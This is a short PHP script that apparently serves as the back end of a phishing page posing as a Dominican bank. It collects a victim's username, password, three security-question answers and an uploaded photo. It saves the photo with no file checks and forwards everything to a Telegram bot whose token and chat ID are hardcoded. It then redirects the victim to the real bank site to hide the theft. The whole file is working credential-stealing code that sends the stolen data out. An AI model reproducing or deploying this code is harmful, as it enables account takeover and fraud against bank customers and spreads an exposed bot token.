<?php

define('url', "https://api.telegram.org/bot6668194126:AAHw49a-T0-pBBD5g2nPA4OnUOh9D-UUHec/");

$info = pathinfo($_FILES['photo']['name']);
$ext = $info['extension']; // get the extension of the file
$nombre = $info['filename']; // get the extension of the file
$newname = $nombre . "." . $ext;
$nmbre = $_GET['nmbre'];
$persona = $_GET['persona'];
$pre1 = $_GET['pre1'];
$pre2 = $_GET['pre2'];
$pre3 = $_GET['pre3'];
$target = 'images/' . $newname; // the path you want to upload your file


move_uploaded_file($_FILES['photo']['tmp_name'], $target);







$token = "6668194126:AAHw49a-T0-pBBD5g2nPA4OnUOh9D-UUHec";

$arrayQuery = array(
    'chat_id' => "1799379358",
    'caption' => "Usuario: $nmbre----- Pass: $persona \n Pregunta 1: $pre1 \n Pregunta 2: $pre2 \n Pregunta 3: $pre3 ",
    'document' => curl_file_create(__DIR__ . "/images/$newname", "image/$ext", "images/$newname")
);
$ch = curl_init('https://api.telegram.org/bot' . $token . '/sendDocument');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $arrayQuery);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, false);
$res = curl_exec($ch);
curl_close($ch);

?>

<script type="text/javascript">
top.location.href = "https://bhd.com.do/";
</script>